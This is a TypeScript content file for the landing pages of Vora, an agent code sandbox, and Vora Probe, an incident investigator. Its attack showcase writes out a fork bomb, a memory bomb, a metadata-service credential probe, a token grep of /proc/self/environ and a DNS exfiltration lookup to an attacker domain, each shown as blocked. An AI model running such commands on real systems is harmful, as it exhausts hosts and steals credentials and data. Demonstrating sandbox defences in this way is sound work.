// Every fact on the landing pages comes from this file, and every fact here is
// traceable to the vora / vora-probe repositories (README, ADRs, benchmarks).
// Keep it that way: no invented customers, uptime or region counts.

export const LINKS = {
  github: "https://github.com/vorash/vora",
  probe: "https://github.com/vorash/vora-probe",
  docs: "https://github.com/vorash/vora#readme",
  threatModel:
    "https://github.com/vorash/vora/blob/main/docs/architecture/threat-model.md",
  adrs: "https://github.com/vorash/vora/tree/main/docs/adr",
  examples: "https://github.com/vorash/vora/tree/main/examples",
};

export const STATUS = {
  version: "v0.7",
  stage: "Proof of concept",
  license: "MIT",
  next: "v1.0 — Firecracker microVM tier",
};

// Lead with exec latency and density; the 1.1s cold create is honest but loses
// a headline race against microVM snapshot restores, so it lives in BENCH.
export const STATS = [
  { value: "7", unit: "ms", label: "exec round-trip", note: "BenchmarkExec · bwrap" },
  { value: "5.3", unit: "MiB", label: "of paranoia per sandbox", note: "idle, measured" },
  { value: "0", unit: "", label: "KVM required", note: "any Linux box, even a CI runner" },
  { value: "0", unit: "", label: "Kubernetes in the path", note: "one Go runner daemon" },
];

export const BENCH = {
  host: "16 vCPU laptop · Linux 7.2 · bwrap backend · 2026-09-16",
  rows: [
    { k: "exec round-trip", v: "6.9 ms" },
    { k: "create → running, p50", v: "1.143 s" },
    { k: "create → running, p99 @ 50 concurrent", v: "1.157 s" },
    { k: "memory per sandbox", v: "5.3 MiB" },
    { k: "failures @ 50 concurrent", v: "0" },
    { k: "cleanup, 50 sandboxes", v: "785 ms" },
  ],
};

export type Attack = {
  id: string;
  name: string;
  intent: string;
  command: string;
  output: string[];
  verdict: string;
  boundary: string;
};

// Outputs are the literal ones from the vora README where one exists.
export const ATTACKS: Attack[] = [
  {
    id: "metadata",
    name: "Steal cloud credentials",
    intent: "Reach the instance metadata service",
    command: `python3 -c 'import socket; s=socket.socket(); s.settimeout(2); print(s.connect_ex(("169.254.169.254",80)))'`,
    output: ["169.254.169.254 => BLOCKED"],
    verdict: "BLOCKED",
    boundary: "network namespace · default-deny",
  },
  {
    id: "forkbomb",
    name: "Fork bomb",
    intent: "Exhaust the host's process table",
    command: ":(){ :|:& };:",
    output: ["sh: fork: Resource temporarily unavailable", "reason: PidsLimitExceeded"],
    verdict: "CONTAINED",
    boundary: "cgroup v2 · pids.max",
  },
  {
    id: "membomb",
    name: "Memory bomb",
    intent: "Allocate until the host falls over",
    command: `python3 -c 'b=[]\nwhile 1: b.append(bytearray(1<<20))'`,
    output: ["Killed", "reason: OOMKilled  (memory.max 512Mi, swap 0)"],
    verdict: "KILLED",
    boundary: "cgroup v2 · memory.max",
  },
  {
    id: "rootfs",
    name: "Tamper with the system",
    intent: "Write outside the workspace",
    command: "touch /etc/foo",
    output: ["touch: cannot touch '/etc/foo': Read-only file system"],
    verdict: "DENIED",
    boundary: "read-only rootfs",
  },
  {
    id: "secrets",
    name: "Exfiltrate the API token",
    intent: "Find the GitHub token the job uses",
    command: "env | grep -i token; grep -a TOKEN /proc/self/environ",
    output: ["(no output)", "VORA_BROKER_URL is the only thing here"],
    verdict: "NOTHING TO STEAL",
    boundary: "credential broker",
  },
  {
    id: "dns",
    name: "Tunnel data over DNS",
    intent: "Resolve a name that is not on the allowlist",
    command: "nslookup aGVsbG8.exfil.attacker.io",
    output: ["** server can't find aGVsbG8.exfil.attacker.io: NXDOMAIN"],
    verdict: "NXDOMAIN",
    boundary: "allowlist-only resolver",
  },
];

export type Pillar = {
  key: string;
  title: string;
  line: string;
  detail: string;
  proof: string;
};

export const PILLARS: Pillar[] = [
  {
    key: "network",
    title: "Default-deny network",
    line: "No interfaces. No routes. No surprises.",
    detail:
      "Open only what the job needs: an SNI-inspecting egress gateway, an allowlist-only DNS resolver, and metadata, loopback and private ranges blocked in every mode.",
    proof: "none · restricted · full · private",
  },
  {
    key: "audit",
    title: "A flight recorder",
    line: "Every exec. Every packet decision. On the record.",
    detail:
      "Lifecycle events, per-execution records and allowed/denied egress, stored in JSONL or Postgres, with OpenTelemetry traces and Prometheus metrics. Allows fail closed if they can't be audited.",
    proof: "vora logs --egress",
  },
  {
    key: "identity",
    title: "Agents have names",
    line: "spiffe://vora.sh/tenant/t1/agent/reviewer",
    detail:
      "Agent-bound API keys confine a key to one agent's sandboxes. Every audit record answers: which agent, on whose key.",
    proof: "vora keys create --agent reviewer",
  },
  {
    key: "isolation",
    title: "Two kernels of distrust",
    line: "Bubblewrap or gVisor, chosen per sandbox.",
    detail:
      "Namespaces, cgroup v2 and a seccomp filter — or a user-space kernel that never lets a syscall touch yours. Read-only rootfs; only /workspace, /root and /tmp are writable.",
    proof: "TestFilesystemIsolation · TestPIDNamespaceIsolation · both backends",
  },
  {
    key: "secrets",
    title: "Secretless credentials",
    line: "Your agent calls GitHub. It never sees the token.",
    detail:
      "The token lives encrypted in the control plane. The gateway attaches it upstream over TLS — it never enters the sandbox env, filesystem, /proc, or the audit log.",
    proof: "vora secrets set --alias github",
  },
  {
    key: "fork",
    title: "Snapshot & fork",
    line: "Branch one state into many parallel agents.",
    detail:
      "Capture a running sandbox live, then fork independent copies from it. Fan out N candidate patches from one repo state and keep the one that passes.",
    proof: "vora snapshot fork snap_…",
  },
  {
    key: "budgets",
    title: "Budgets, not hopes",
    line: "Memory, CPU, PIDs, disk and TTL on every box.",
    detail:
      "A runaway workload gets OOMKilled, PidsLimitExceeded or TimeoutExceeded — a semantic reason your agent can read — instead of your host.",
    proof: "--memory 512m --cpu 1 --pids 128 --ttl 10m",
  },
  {
    key: "agents",
    title: "Plugs into your agent",
    line: "MCP server, TypeScript & Python SDKs, OpenAI Agents.",
    detail:
      "Give Claude Code, Cursor or your own loop a real Linux box through six MCP tools, or wire it yourself with a zero-dependency SDK.",
    proof: "claude mcp add vora …",
  },
];

export const CODE = {
  cli: `$ vora sandbox create --image vora/python \\
    --memory 512m --cpu 1 --pids 128 --network none
Sandbox created: sbx_01M2NVHE1KRD8JT3D6QG6R0EW3

$ vora exec sbx_01M2… -- python3 -c 'print("hello from vora")'
hello from vora

$ vora logs sbx_01M2…
13:20:02  REQUESTED -> SCHEDULING -> CREATING -> STARTING
13:20:03  STARTING -> RUNNING`,
  typescript: `import { Vora } from "@vorash/sdk";

const vora = new Vora(); // VORA_API_URL, VORA_API_KEY

const box = await vora.sandboxes.create({
  image: "vora/python",
  memory: "512Mi",
  pids: 128,
  network: "none",
  ttl: "10m",
});

await box.writeFile("/workspace/main.py", untrustedCode);
const { stdout, exitCode } = await box.exec("python main.py");

await box.destroy();`,
  python: `import vora

async with vora.Vora() as client:
    box = await client.sandboxes.create(
        image="vora/python", memory="512Mi", network="none",
    )
    try:
        result = await box.exec(generated_script)
        print(result.stdout, result.reason)
    finally:
        await box.destroy()`,
  mcp: `$ claude mcp add vora --scope user \\
    --env VORA_API_URL=https://vora.internal \\
    --env VORA_API_KEY=vora_… \\
    -- node vora/sdk/mcp/dist/index.js

# six tools, bounded by default:
sandbox_create   sandbox_exec   sandbox_read_file
sandbox_write_file   sandbox_stats   sandbox_destroy`,
};

export const CODE_TABS: { key: keyof typeof CODE; label: string }[] = [
  { key: "cli", label: "CLI" },
  { key: "typescript", label: "TypeScript" },
  { key: "python", label: "Python" },
  { key: "mcp", label: "MCP" },
];

export const AUDIT_LOG = [
  { t: "21:00:00.112", kind: "event", text: "STARTING -> RUNNING", actor: "agent/reviewer" },
  { t: "21:00:00.480", kind: "exec", text: "pip install -r requirements.txt", actor: "agent/reviewer" },
  { t: "21:00:01.031", kind: "egress", text: "allowed  pypi.org:443", actor: "agent/reviewer" },
  { t: "21:00:01.207", kind: "egress", text: "denied   169.254.169.254:80", actor: "agent/reviewer" },
  { t: "21:00:02.644", kind: "egress", text: "allowed  alias=github api.github.com", actor: "agent/reviewer" },
  { t: "21:00:03.090", kind: "dns", text: "NXDOMAIN exfil.attacker.io", actor: "agent/reviewer" },
  { t: "21:00:04.371", kind: "exec", text: "pytest -q  → exit 0", actor: "agent/reviewer" },
  { t: "21:00:04.902", kind: "event", text: "RUNNING -> STOPPED  (TimeoutExceeded)", actor: "ttl-reaper" },
];

export const USE_CASES = [
  { title: "Agent tools", text: "Give an LLM a run_code tool without executing anything on your host." },
  { title: "Untrusted PRs", text: "Run a stranger's test suite without letting it touch your CI runner." },
  { title: "Codegen gates", text: "Accept AI-written code only after it passes its tests in isolation." },
  { title: "User plugins", text: "Execute uploaded data-transform plugins as part of your product." },
  { title: "Autograders", text: "Grade homework and CTF submissions with hard limits and a paper trail." },
  { title: "Patch fan-out", text: "Evaluate N candidate patches from one repo state, in parallel." },
];

export const PROBE = {
  name: "Vora Probe",
  tagline: "An incident investigator that refuses to guess.",
  description:
    "Probe investigates infrastructure read-only. Its untrusted worker runs inside a Vora sandbox with no network and no credentials, one deterministic step per exec — and a claims policy that runs after the model and cannot be talked out of a refusal.",
  refusals: [
    { title: "Termination is not a leak.", text: "A sawtooth memory series is a kill at the limit, not sustained growth." },
    { title: "Proximity is not causation.", text: "A rollout minutes before the impact is not a cause without a mechanism." },
    { title: "Missing evidence is reported.", text: "Gaps become published coverage gaps, never filled-in guesses." },
  ],
  finding:
    "An evidenced memory-limit kill is identified. A leak is refused because the sawtooth series does not show sustained growth.",
  command: "go run ./cmd/vora-probe replay test/fixtures/oom/oom-positive --out .probe",
};

// Sources: vora-probe/README.md, docs/architecture.md, docs/claims-policy.md,
// test/fixtures/oom/README.md and cmd/vora-probe/main.go. Keep demo labels
// descriptive rather than fabricating an investigation's literal output.
export const PROBE_PAGE = {
  eyebrow: "Read-only infrastructure investigation · built on Vora",
  headline: ["Find the cause.", "Or say you can't."],
  intro: "Probe investigates a service without changing it. It gathers bounded evidence, tests competing explanations and publishes what it can support — including what it couldn't establish.",
  traits: ["Open source", "MIT", "Go 1.25+", "No third-party dependencies"],
  illustration: {
    evidence: ["memory-limit kill", "working set / sawtooth", "sustained growth"],
    admitted: "Memory-limit termination",
    refused: "Memory leak",
    admittedNote: "supported by retained evidence",
    refusedNote: "growth across restarts not shown",
    caption: "An illustration of the OOM fixture",
  },
  caseIntro: "Frozen OOM fixtures pin what Probe can conclude and what it must refuse. Pick a case to inspect the boundary.",
  cases: [
    {
      id: "oom-positive",
      label: "01 / memory limit",
      title: "A kill is not a leak.",
      observation: "A memory-limit kill is evidenced. The working set has a sawtooth shape.",
      allowed: "The container was killed at its memory limit.",
      refused: "The application leaks memory.",
      why: "A kill at the limit does not establish sustained growth across restarts.",
    },
    {
      id: "misleading-deployment-correlation",
      label: "02 / rollout",
      title: "Timing is not a mechanism.",
      observation: "A rollout lands near the impact. Memory is flat; query volume is unchanged.",
      allowed: "The cause is not established by the retained evidence.",
      refused: "The rollout caused the impact.",
      why: "A nearby deployment without evidence of a changed mechanism is correlation, not causation.",
    },
    {
      id: "missing-telemetry",
      label: "03 / coverage gap",
      title: "Missing data stays missing.",
      observation: "Restarts are visible. The terminating cause and required telemetry are not.",
      allowed: "Restarts occurred; the terminating cause is unknown.",
      refused: "A specific cause of the restarts.",
      why: "Unavailable or truncated responses become visible coverage gaps in the report.",
    },
    {
      id: "non-oom-restart",
      label: "04 / probe failure",
      title: "A restart is not an OOM.",
      observation: "A probe-driven restart occurs with memory far below its limit.",
      allowed: "The restart is not memory-driven.",
      refused: "The container ran out of memory.",
      why: "A probe failure and restart do not prove memory exhaustion.",
    },
  ],
  setup: ["git clone https://github.com/vorash/vora-probe.git", "cd vora-probe"],
  replay: "go run ./cmd/vora-probe replay test/fixtures/oom/oom-positive --out .probe",
  artifacts: ["RUN-…/report.md", "RUN-…/report.json", "RUN-…/RUN-….journal.jsonl"],
  layers: [
    { number: "01", title: "Only named requests", detail: "The gateway validates an action and metric against closed allowlists, with bounded evidence windows." },
    { number: "02", title: "Only in scope", detail: "Policy checks entity scope and an explicit deny list before an infrastructure request runs." },
    { number: "03", title: "Only supported claims", detail: "After the model, the claims policy narrows unsupported assertions and shows both the refusal and what the evidence does support." },
  ],
  method: {
    intro: "The trusted controller holds credentials, the network, the model and the journal. The untrusted worker gets no network or credentials; each invocation makes one deterministic step.",
    controller: {
      title: ["Owns the keys.", "Checks every request."],
      text: "Authorizes bounded infrastructure calls, runs the model and journals requests before execution.",
      meta: "network · credentials · model · store",
    },
    worker: {
      title: ["One step.", "No side doors."],
      text: "Reads a bounded state envelope and one pending result; returns a request or a final report.",
      meta: "no network · no credentials",
    },
    note: "Replay runs the worker in-process. A configured live run executes the same worker through Vora's public sandbox API. Neither path gives the investigator a mutation tool.",
  },
  tryIntro: "The recorded path needs no cluster, credentials or model endpoint. Clone the repository, then run the full investigation against a frozen fixture.",
  tryAside: "An evidence-linked Markdown and JSON report, plus an append-only journal. Refused claims appear beside their narrowed, supported form.",
  requirement: "Go 1.25+",
  status: "Pre-1.0",
  limits: [
    "The offline replay runs against authored fixtures, not live production incidents. Live investigation needs operator-supplied Vora, Kubernetes, Prometheus and a model endpoint. The library is tagged v0.x; its public surface is intended to be stable but is not yet frozen.",
    "Evaluator comparisons report counts and spreads, not statistical significance. An unconfigured model arm is marked blocked, never silently replaced. Recommendations are proposals; Probe does not execute remediation.",
  ],
  closing: ["The report should know", "what it doesn't know."],
};

export const FAQ = [
  {
    q: "Why not Firecracker?",
    a: "Because Bubblewrap and gVisor run on any Linux box — a cheap VPS, a laptop, a CI runner without nested virtualisation. A Firecracker microVM tier is the v1.0 milestone, behind the same runtime interface.",
  },
  {
    q: "Is Bubblewrap enough isolation?",
    a: "It shares the host kernel, so a kernel exploit defeats it. For hostile workloads pick the gVisor backend per sandbox: a user-space kernel sits between the code and yours. The threat model says exactly this.",
  },
  {
    q: "Can a malicious workload misuse a brokered credential?",
    a: "It can ask the broker to call the one host the alias is bound to — that is the point. It cannot read the token, redirect it elsewhere, or smuggle it out, and every call is on the egress record.",
  },
  {
    q: "Is it production-ready?",
    a: "No. v0.7 is a proof of concept: implemented, covered by tests, not independently audited. We would rather you know that from the homepage.",
  },
];

export const AGENT_PROMPT = `Use Vora (https://github.com/vorash/vora) to run any code you generate.
Create a sandbox with network "none", memory 512Mi, pids 128 and a 10m TTL,
write files to /workspace, exec there, read the result, and destroy the
sandbox when done. Never run generated code on the host.`;

export const LIMITS = [
  "Not independently audited. Don't trust it with anything that matters — yet.",
  "bwrap syscall filtering is a deny-list: hardening, not the boundary.",
  "full / private network modes are bwrap-only today.",
  "Brokering is an explicit route, not a transparent MITM.",
];
